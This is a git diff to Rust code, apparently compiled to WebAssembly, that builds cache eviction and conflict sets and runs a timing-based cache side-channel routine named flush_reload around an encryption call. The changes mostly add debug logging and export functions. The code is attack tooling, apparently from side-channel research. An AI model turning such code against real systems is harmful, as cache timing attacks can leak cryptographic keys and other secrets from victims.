@@ -2,7 +2,7 @@ use core::{hint::black_box, mem::ManuallyDrop};
 
 use alloc::{boxed::Box, collections::LinkedList, vec::Vec};
 
-use self::env::{timed_access, timed_hit};
+use self::env::{random, timed_access, timed_hit};
 
 const CACHE_LINE_SIZE: usize = 64;
 const CACHE_ASSOCIATIVITY: usize = 12;
@@ -62,17 +62,19 @@ fn wait(number_of_cycles: u32) {
     }
 }
 
+#[inline(always)]
 fn get_slow_time(eviction_set: &LinkedList<u32>, offset: u32) -> u64 {
     evict(eviction_set);
     timed_access(offset)
 }
 
-fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
+#[no_mangle]
+pub fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
     eviction_sets.iter().flatten().cloned().collect()
 }
 
-fn generate_eviction_set(
-    target: &[u8],
+#[no_mangle]
+pub fn generate_eviction_set(
     probe: u32,
     candidate_set: &LinkedList<u32>,
     threshold: u64,
@@ -80,19 +82,36 @@ fn generate_eviction_set(
     let mut candidate_set = candidate_set.clone();
     let mut eviction_set: LinkedList<u32> = LinkedList::new();
     while let Some(random_offset) = candidate_set.pop_front() {
+        env::log(random_offset as u64);
+        env::log(44444444);
+        env::log(eviction_set.len() as u64);
+        env::log(candidate_set.len() as u64);
         if eviction_set.len() >= CACHE_ASSOCIATIVITY {
             break;
         }
+        env::log(55555555);
         let mut new_eviction_set: LinkedList<u32> = eviction_set.clone();
-        new_eviction_set.append(&mut candidate_set);
+        env::log(candidate_set.len() as u64);
+        new_eviction_set.append(&mut candidate_set.clone());
+        env::log(candidate_set.len() as u64);
         if threshold < get_slow_time(&new_eviction_set, probe) {
             eviction_set.push_back(random_offset);
         }
+        env::log(eviction_set.len() as u64);
+        env::log(candidate_set.len() as u64);
+    }
+    if candidate_set.len() == 0 {
+        env::log(11111111);
+        env::log(probe as u64);
+        env::log(candidate_set.len() as u64);
+        env::log(eviction_set.len() as u64);
+        env::log(11111111);
     }
     eviction_set
 }
 
-fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
+#[no_mangle]
+pub fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
     let number_of_candidates = target.len() / CACHE_LINE_SIZE;
     let mut candidates: Vec<usize> = (0..number_of_candidates)
         .map(|i| (target.as_ptr() as usize) + (CACHE_LINE_SIZE))
@@ -110,10 +129,6 @@ pub extern "C" fn my_alloc(len: usize) -> *mut u8 {
     let align = core::mem::align_of::<usize>();
     let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
     unsafe { alloc::alloc::alloc(layout) }
-    // let mut buf = Vec::<u8>::with_capacity(len);
-    // let ptr = buf.as_mut_ptr();
-    // core::mem::forget(buf);
-    // ptr
 }
 
 #[no_mangle]
@@ -140,12 +155,11 @@ pub extern "C" fn flush_reload(
     let candidate_set: LinkedList<u32> = generate_candidate_set(target);
     let eviction_sets: Vec<LinkedList<u32>> = probes //config.probes
         .iter()
-        .map(|offset| {
-            generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold as u64)
-        })
+        .map(|offset| generate_eviction_set(*offset, &candidate_set, threshold as u64))
         .collect();
     let conflict_set: LinkedList<u32> = generate_conflict_set(&eviction_sets);
     env::encrypt();
+    env::log(123);
     let results: Vec<u32> = (0..time_slots)
         .flat_map(|_| {
             let start = env::get_time();
@@ -158,6 +172,7 @@ pub extern "C" fn flush_reload(
             time_slot_results
         })
         .collect();
+    env::log(123);
     let boxed: Box<[u32]> = results.into_boxed_slice();
     boxed
 }
